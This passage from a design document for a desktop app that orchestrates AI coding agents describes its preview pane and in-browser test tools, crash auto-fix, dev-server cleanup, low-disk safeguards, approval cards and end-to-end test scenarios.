beside the chat (`components/agents/AgentPreviewPane.tsx`) instead of moving
the window to the workspace. **Open in workspace** is the secondary action.
Older cards get it too: only `result.project` or `changes` is needed.

- **Which folder**: decided from the card as the log has it
  (`agents_preview_target` → `preview_test::resolve`), never from a path the
  client names. A live copy's card shows the copy (its own dev port, seeded at
  creation); a kept or discarded copy's card, a plain change card or a result
  shows the project, which must still be one of the user's projects.
- **Port**: a server already up in this app wins, else the folder's saved
  port, else the usual per-folder one (`pick_port`, `preferredPortForProject`).
- **Starting**: through the window's own dev-server owner (App's
  `useDevServer`, passed down as `AgentPreviewServer`), so the install gate and
  the "run this project's commands?" consent are the same ones; the pane shows
  the consent prompt in place, "needs its dependencies installed first" with
  Open in workspace, "has no web preview", or a calm "Starting <name>…".
- **The frame**: the workspace preview's own plumbing (`usePreviewConnection`:
  proxy, injected inspector, health checks) with a smaller toolbar: Back (pages
  this pane visited), the address (paths on this site only;
  `parsePreviewAddress` refuses other hosts), Reload, and a width. What the page
  itself loads is the page's business, as in the workspace preview (the one
  place the webview loads a project's content).
- **Routing**: the pane registers itself (`agents_preview_attach`, one per
  window); `agent_bridge::dispatch_tool` sends that folder's preview tools to
  it (`target: "pane"`; the workspace listener ignores those, the pane answers
  nothing else). The pane registers with no agent CLI.

**Test it** (pane header, or on the result card, which opens the pane and
starts once the site is up) records "Test it in the preview" as your message
and asks the agent (`test_prompt`) to click through the site while you watch.

- **Tools**: `test_open`, `test_click`, `test_type`, `test_scroll`,
  `test_viewport`, `test_page`, `test_console`, `test_network`,
  `test_screenshot`, `test_note`, `test_report` — listed only while the user's
  run is open, only for that folder, refused once the pane is closed or the
  run stopped. They run the existing preview bridge tools against the pane.
  Clicking around your own localhost is local work: like Bold's local work,
  no card, at any level (they're app tools, reachable only after you pressed
  Test it). Everything else in that turn is under the usual rules.
- **Steps are observed**: each action becomes a step in the app's words
  ("Opened /pricing", "Clicked “Sign up”", "Couldn't click …" when it matched
  nothing); typed values never show; `test_note` is the agent's own line
  ("Form showed an error"). Steps stream to the pane (`agents://preview-test`).
  Screenshots are copied into `attachments/<run id>/` (8 at most).
- **The report** (`test_report`: outcome, summary, what's broken) becomes a new
  version of the card, staged for the turn's end like `share_result`. Console
  errors on it are read from the preview's own capture since the run began
  (`preview_console` with `since`). A live copy's card stays a change card, so
  Keep / Discard carry over to the newest version. A copy card without a result
  gets a first one ("Tested <project>"). Too much is refused, never trimmed.
- **Nothing goes silent**: a test turn that ends without a report leaves "The
  test stopped before it reported back."; closing the pane stops the run.
- **Phone**: the card shows the outcome, what's broken and the screenshots as a
  swipeable strip, and **Watch live** (docs/mobile.md).
- Not verified: a full Test it turn against a real engine and dev server in
  the running app (the parts are unit-tested and the pane is seen in the UI
  harness against a fictional site); a report staged in the same turn as a
  `share_result` replaces it.

### A preview that stops by itself (`agents/preview_fix.rs`)

- **Seen where it happens.** `useDevServer`'s exit watcher reports every exit
  the app didn't ask for (`lib/devServerExits.ts`) with the agent whose pane
  shows that folder (`agents_dev_server_exited`). Owner: that pane's agent,
  else the agent that last ran `preview_start` on it while it's working or the
  folder is its copy. No owner: the pane keeps "The workspace shows why".
- **The agent fixes it.** A note from the app (not the user): "Your preview for
  <project> stopped: <reason>. Fix it and restart it with preview_start", with
  the last 60 lines it printed. The reason reads the log first (port in use,
  missing module, compile error), then the exit code.
- **No loop.** At most one automatic wake per folder per 10 minutes; every fix,
  woken or asked, counts; a server that stops again after 2 fixes gets one
  plain error line in the agent's chat instead, then silence until a fix holds
  30 minutes or the user asks again. Settings → Agents → "Fix stopped previews"
  turns the wake off (the pane then offers to ask). From chat too: the Chief's
  `propose_settings_change` with `changes: { fix_previews }` and no agents
  (admins only, on its own). Off only has agents do less, so it applies at once
  with a "Settings changed: This Mac: …" line; on is a "Change this Mac's
  settings?" card (`policy_card::mac_proposal`, the card's `mac` field). The
  Settings row reads it again on every policy event.
- **The pane** shows "<Agent> is fixing it…" while that turn runs (15s grace for
  it to start), the frame back once the server is; otherwise "Ask <Agent> to fix
  it", with "Open in workspace" as a quiet link.
- Not verified: a real crash → wake → restart round trip in the running app (the
  decisions and prompt are unit-tested; the pane is seen in the harness with a
  stub PTY that exits).

## Showing the work (`agents/narration.rs`, `agents/local_links.rs`, `agents/dev_servers.rs`)

Visual work is shown, early and on one card, without being asked. The rules
live in the app-owned `SHOW_WORK` section of every agent's system prompt
(`prompts.rs`), built each turn, so agents created before it get it with
nothing in their own `CLAUDE.md` touched.

- **One card for visual work.** `share_result` file items take a `page` next
  to `role` (before/after). The card shows one compare per page (side by
  side or a slider, a page switcher, the agent's captions) with Preview,
  Watch live and Test it (`comparePages` in `companion-protocol/results.ts`).
- **Checkpoints.** `checkpoint: true` records the card at once, marked
  "Partway through"; the same turn's next `share_result` becomes its next
  version (`results::continue_checkpoint`), so a turn still ends on one card.
- **Narration folds into the timeline.** A short reply (no question, link,
  list, code block, wait on the user or setback told to them; one paragraph,
  ≤420 chars) is held. Inline code and a setback the agent works past ("can't
  read the logs here, so reading the code") don't stop it: a debugging turn
  put seventeen such lines in the chat. If the turn writes again or
  calls a tool, it becomes a `note` step and its streamed draft is withdrawn
  (an empty draft event). If the turn ends on it, it is the reply; a turn
  that only narrated still ends on its last line. Nothing goes silent.
- **Local links.** `http://localhost:…` (and 127.0.0.1, 0.0.0.0, [::1]) in a
  reply is taken out of the text into `localLinks`. A port the app knows
  serves a project (a preview proxy, a server the turn left in a project or
  its copy, a listener whose folder is a project) offers Preview
  (`agents_preview_target` with `link`) and, on Macs with `watch.links`,
  Watch live; any other is a "running on this Mac" chip, never a dead link.
  Code spans are left alone.
- **Dev servers are cleaned up.** What the turn's engine started is noted by
  ancestry (its process tree while it ran, its process group). At the turn's
  end, listeners nobody is looking at are stopped; one a pane shows, a phone
  watches, or the turn just showed (a link, a card naming its project) is
  kept, and stopped after 10 minutes unwatched. Before any stop the pid must
  still run the command recorded.
- **No plumbing talk.** The prompt forbids tool, server, port and
  "offline" talk; the preview bridge's "nothing is showing" error tells the
  agent what to do instead and not to relay it.
- **Unlisted projects.** A card naming a repository folder that isn't a
  project yet lists it first (`project::ensure_listed` → `workplace`'s
  registration), so Preview works without the user opening anything.

Not verified: a live turn end-to-end (narration folding and dev-server
cleanup are covered by unit tests of the rules, not a real Claude Code run);
Watch live on a server the turn left (outside a preview proxy).

## The Chief's audit trail and live hand-offs

- `create_agent`, `update_agent` and `delete_agent` leave a quiet note in the
  Chief's chat ("Created Finance · Invoices and the books", "Updated Acme
  Site's instructions", "Deleted Social Posts"), and creates and updates one in
  the target's ("Created by Chief of Staff", "Instructions updated by Chief of
  Staff"). The note's `peer` makes the name a link.
- The newest line where an agent handed work to each peer shows that peer's
  live state: working (with its activity), needs your OK, didn't finish (its
  newest outcome line is an error, read from its chat or the last few lines of
  its log), or idle.
- In the receiving chat, the brief that started the turn in progress is open
  until the turn ends (or you toggle it).

## Disk space (`agents/disk.rs`)

Observed 2026-11-07: an agent's dependency sweep cloned ~40 repos into its home
(`sweep-<date>/{clones,wt}`) and ran `npm ci` in many copies at once. Its home
reached 39 GB, plus the npm cache, and the Mac fell to 1–2 GB free overnight.
Nothing warned anyone or stopped it. Three things now do.

**Awareness.** Free space on the volume holding the user's home is one
`statvfs` call: read every 2 minutes while the app is open, and fresh for every
turn and approval. Two lines, in decimal GB as Finder counts:

- **Below 15 GB (low):** every turn opens with a note from the app, in the
  turn's prompt, never the system prompt, so the cache holds ("this Mac's disk
  is low: N GB free. Clean up before installing or cloning…"). The Chief's chat
  gets one quiet line.
- **Below 5 GB (the floor):** a Bash call that installs packages or clones
  (`disk::fetches`: npm/pnpm/yarn/bun installs, pip/uv/poetry, cargo
  build/test/run/fetch, go get/build/mod download, brew install, `git clone`,
  `gh repo clone`, also inside `bash -c` and loops) asks on a card at every
  level, Unleashed included. No "Always allow" rule answers it; a plan the user
  allowed (`ask_plan`) still covers what it lists. The card says why ("This Mac
  has N GB free, under the 5 GB floor…"), and the turn's note says installs now
  ask. The Chief's chat gets a line and the user gets one notification.

Each line is said once per dip, and again only after space came back 2 GB above
that line. That state is in memory: a relaunch while low says it once more. A
reading that fails counts as fine, never as low.

**Cleanup by default.** The prompt's Work section tells agents doing bulk work
to install in a few copies at a time and, done with each, delete its
`node_modules` and build folders, keeping reports and unpushed commits. The app
also tidies after them: when an agent goes idle (its queue drained), its home's
regenerable folders untouched for 6 hours (1 hour while disk is low) are
removed. A folder is removed only when all of these hold:

- its name is `node_modules`, `.next`, `.turbo` or `target`, and the file that
  rebuilds it is beside it (`package.json`; for `.next` also `next.config.*`;
  for `.turbo` also `turbo.json`; `Cargo.toml` for `target`). A `target` folder
  of notes is not a build folder;
- it is a real folder inside the agent's home, found without following a link
  or entering a `.git` folder, and nothing anywhere inside it is a `.git` or
  was changed within the age limit (a folder's own date moves only with its
  direct entries; a walk past 250,000 entries keeps it);
- inside a working copy, git ignores it (`check-ignore`) and tracks nothing in
  it (`ls-files`), so removing it changes nothing git would call a change. Any
  doubt (git missing, an error, a timeout) keeps it;
- no dev server a turn left running for the user, and no preview pane, runs
  from its folder (or around it): a folder's date says nothing about a server
  loading from it (`dev_servers::in_use`);
- the agent hasn't started working again (checked before each removal).

Only agent homes: never a project, an agent's copy of one (those live under
`<projects root>/.worktrees/` and go with Keep/Discard), or the user's folders.
`.git` folders, reports and unpushed commits are never touched. The search stops
at 8 levels and 200,000 entries.

**Settings → Agents → Disk space** (`AgentsDiskSettings`, ⌘K "Disk space used
by agents…") is hidden while disk is fine and no home is 1 GB or more.
Otherwise it shows free space when low, and each home of 1 GB or more: its
size, how much of it is in regenerable folders, and **Free up space**, which
runs the same prune with no age limit (refused while the agent is working). Its
line then says what it did ("Freed 37 GB."), and how many it left because git
doesn't ignore them. Sizes are on-disk blocks, measured on demand and kept for 5
minutes.

Not covered: package-manager caches outside the home (`~/.npm`,
`~/Library/Caches/pnpm`) still grow; installs in a project or a project copy
aren't pruned (only the floor's card stops them); a room turn doesn't get the
low-disk note. The card wiring in `mcp::decide_inner` is covered by
`disk::floor_asks` unit tests, not by an end-to-end approval test.

## Known limits / next

- Claude Code and Codex (see "Engines"). Opencode would slot in the same
  way: a command line and a mapping onto `stream::Step`.
- Search scans files on every query. Fine at one person's scale (tens of
  agents, thousands of lines); an index would be needed well past that.
- Turns at once are scaled to RAM (3–16, `agents::capacity`); the rest wait,
  shown as "Waiting for a free slot". An agent waiting on an approval card
  holds its slot until it is answered or the wait runs out.
- A scheduled run's retry lives on the registry, but the ticket matching it to
  its turn is in memory: a turn cut off by quitting is recorded as such, not
  retried.
- Nothing a turn starts outlives it. `claude --print` waits for any
  background task its Bash tool started (observed with 2.1), so a dev server
  left running would keep the agent "working" for hours; instead, a few
  seconds after the turn's result the tree is stopped. An agent can't leave a
  server running for you to look at.
- Check-ins and routines only fire while the app is open.
- Notification click-through is unverified in a signed build.
- After a restart, the interrupted turn is picked up once in its own session
  (never from scratch); messages queued behind it are sent once. Not
  verified against a real crash of a running Claude Code or Codex turn: the
  detection, the one pick-up and the saved progress are unit-tested only.
- Debug builds: `research/design-canvas` (not on main) disables the agent
  bridge under `debug_assertions`. Agents depends on it, so that branch needs
  an exception for the `/agents/` route before both land.
- Mobile: the import tool and remote access already put Agents within reach of
  a phone assistant. A native client would talk to the same commands.

## Testing

- `cargo test --lib agents::`: store (including frozen compatibility
  fixtures in `agents/testdata/compat/`: every registry shape and message
  kind users have on disk must load, and a write must keep what a newer build
  added), process trees, share-path validation (traversal, symlinks), prompts framing, activity labels, MCP
  tool visibility, approval descriptions, import merge rules, memory parse and write-back (odd markdown included), the retry schedule and run settling, broker admission and the init check, memory-scaled slots.
- `cargo test --lib agents::rooms agents::runner::rooms_runner_tests`: who answers, mentions in replies, the turn and hop caps, a turn taking one place at a time, a room's Stop leaving the agent's own queue alone, the thread's card answers, the prompt's bounded and honest window, delete and leave, search.
- `pnpm vitest run src/lib/agentRooms.test.ts src/components/agents/RoomChat.test.tsx` and `node scripts/harness-capture.mjs agents-room`: the room view, composer mentions, Who should answer?, an approval in a room, the fold line, New room.
- `cargo test --lib agents::results`: share_result validation and size caps, files that must exist in the agent's own files (all or nothing), versioning and Ask for changes targets, one card per turn.
- `pnpm vitest run src/components/agents/AgentResult.test.tsx` and `mobile/__tests__/result.test.tsx`: the card on desk and phone, folding, Ask for changes.
- `cargo test --lib agents::templates` and `pnpm vitest run src/components/agents/AgentTemplates.test.tsx`: the catalogue, the Chief's section, `create_agent`'s schema, the dialog's fill-in and swap rules; `mobile/__tests__/start.node.test.ts`: the phone's list and create.
- `node scripts/harness-capture.mjs agents-first-win` / `agents-template-`: the starters and the gallery (`agents-ideas`, `agents-ideas-when`: team, brief and site typed; a document staged and New agent on Research, both from the gallery), first results (a team built, a document summarised), Inbox in the dialog with its connect line, and a Chief-made Inbox's first open.
- `node scripts/harness-capture.mjs agents-result`: v1, asking, v2, not verified, a copy's card with before/after.
- `pnpm vitest run src/lib/agents.test.ts`: chat grouping, dividers, ordering.
- `scripts/agents-e2e.sh [scenario…]` (opt-in, real turns, on Haiku): `src-tauri/examples/agents_e2e/main.rs` drives the real
  runner, store, bridge and MCP tools through the same Tauri commands the UI
  calls, on `claude --model haiku`, in a throwaway HOME (only the keychain is
  linked, for sign-in). Scenarios: memory across turns, quit mid-turn and
  relaunch (a second process, SIGKILLed), lost session file, a bound project agent
  (runs in the project, leaves a change card), delegation +
  two agents at once + the hop cap, Stop and interrupt, approvals (Allow,
  late Allow after a shortened wait, Always allow), a fake CLI (startup
  error, garbage output, crash, bare error code), damaged store files, 20
  rapid messages, a session's questions (`session-prompt`: Chief → Site
  Builder → a fresh untrusted project; the trust card in both chats, Allowed
  in the Chief's; trust recorded; the edit's permission card; the edit; a
  change card), Stop ending a turn's whole process tree (a background
  child included), quitting mid-turn (the Exit hook, then relaunch), and more
  turns than slots, and the Memory tab (`memory-tab`: an entry added there is
  read by the next turn, the instructions untouched, Remember this
  summarises on Haiku, and approval requests from no live turn are refused
  without a card). `SHIPSTUDIO_AGENTS_APPROVAL_WAIT_SECS` shortens the 240s
  approval wait in debug builds only. `AGENTS_E2E_KEEP=1` keeps the HOME.
- `cargo test --lib agents::tray agents::quick_entry`: the menu model (sections, order, labels, caps, hidden agents), the quit check, both icons decode, shortcut parsing, labels and conflicts.
- `pnpm vitest run src/lib/agentsDesktop.test.ts src/components/QuitConfirmModal.test.tsx`: the quit dialog's wording and defaults, shortcut recording, quick entry's recipient.
- `node scripts/harness-capture.mjs settings-agents` / `agents-new-with-defaults`: Settings → Agents with the defaults for new agents (chosen, a model menu open, the chosen engine signed out, an engine with no models listed), and the New agent dialog opening on them.
- `node scripts/harness-capture.mjs agents-quit` / `agents-quick-entry` / `agents-desktop`: the quit guard, quick entry's composer (`root: 'quick-entry'`), and its settings.
- Codex: `scripts/agents-e2e.sh codex-memory codex-stop codex-delegation
  codex-approvals` runs those scenarios on Codex. With Codex signed in they
  use the account (its `auth.json` copied into a throwaway `CODEX_HOME`);
  otherwise the real `codex` binary talks to a scripted Responses endpoint
  (`scripts/agents-e2e-codex-model.py`, passed in through the debug-only
  `SHIPSTUDIO_AGENTS_CODEX_CONFIG`), which proves resume, streaming drafts
  kept on Stop/interrupt, delegation through the bridge, and the approval
  round-trip (Allow, Deny with a note the model reads, late Allow, Always
  allow) for an escalated command, not a model's judgement.
  `AGENTS_E2E_CODEX=real|scripted|skip` forces one;
  `SHIPSTUDIO_AGENTS_CODEX_EXEC=1` runs them on the `exec` fallback.
- `scripts/agents-e2e.sh behaviour` (opt-in, about $1.50 for three runs):
  `examples/agents_e2e/behaviour.rs` checks behaviour rather than plumbing,
  each scenario in its own HOME, several runs, with pass rates per check:
  the Chief delegates work that belongs to a specialist (named or not) and
  answers trivial questions itself; one brief and no chatter between agents;
  the Chief reports back unprompted; reminders and "in two hours, tell me"
  get a check-in; no promise of a later update without a check-in or an
  answer actually arriving; every message gets a visible reply; a
  correction is fixed without apology; "ask before sending email" holds
  across turns and sending happens on yes; a fresh Chief offers a daily brief
  and sets it up only on yes; a blocked delegate's blocker reaches the user.
  It prints tokens (the CLI's own), cost, time to first word, and where turn
  time goes (`agents::timing`: our prep, CLI start-up, tail after the
  result). `AGENTS_E2E_RUNS`, `AGENTS_E2E_JOBS`, `AGENTS_E2E_ONLY`,
  `AGENTS_E2E_OUT=<file.json>`.
- `node scripts/harness-capture.mjs agents-`: memory (`agents-memory`, `agents-memory-edit`, `agents-remember`), a routine's past runs and a pending retry (`agents-schedule-history`), project binding (`agents-project-*`), Chief audit (`agents-chief-audit`), brief in progress, team, What's in flight (`agents-team-overview`, via ⌘K), @mention menu, approval, secure input (`agents-secret-*`, `agents-secrets-editor`), first run (keep-awake off and on), new
  agent, import, Claude Code missing, the engine picker (`agents-engine-picker`), Codex not signed in (`agents-engine-unavailable`), one engine installed (`agents-engine-one`), a Codex that can't ask (`agents-codex-cant-ask`) and a Codex agent's chat (`agents-codex-chat`).

### Real end-to-end tests

The core jobs, on real `claude --print` turns (Haiku), at the independence
levels people pick: `scripts/agents-e2e.sh core` (all seven, about $0.06 and
under two minutes) or one `core-…` scenario
(`src-tauri/examples/agents_e2e/core_jobs.rs`). Opt-in, never part of the
default run. Like the rest of the suite it runs in a throwaway HOME (app
data, agents, projects root and Claude Code's session files under it; set
`AGENTS_E2E_HOME` to choose where), signs in through the login keychain
(linked, read only, never copied) and is silent: `SHIPSTUDIO_AGENTS_SILENT`
(debug builds only) stops every banner and sound, even for an agent the
Chief makes mid-run.

| Scenario | Checks |
|---|---|
| `core-delegate` | Bold: the Chief creates Filer (on the saved default model), delegates a file write in its home, hears back; no cards anywhere |
| `core-chain` | Bold: `mkdir`, writes, `ls`, a `for` loop and a log in `$TMPDIR` in one Bash call; no card, its "Allowed automatically — Bold" receipt in What it did |
| `core-often` | The same chain at Careful: a card (allowed, so it finishes) |
| `core-push` | Bold: `git push` to a local bare remote raises a card; denied, nothing reaches the remote |
| `core-result` | `share_result` with a file: one v1 result card naming it, no card for the write |
| `core-kill` | The engine SIGKILLed mid-reply: the partial kept as stopped, a plain error line, and the next message answered |
| `core-search` | WebSearch at Bold: no card, a search step and its receipt |

What the first run found and fixed: an agent asked to `git push` a repository
in its home refused outright ("the push card can't be created"), because the
prompt said to push "only with `push`", the tool that serves projects only.
A push outside the projects now goes through git and its card
(`prompts::PROJECTS`). Not covered: Codex, a project-bound agent's push,
and resuming a killed turn (it ends honestly instead).
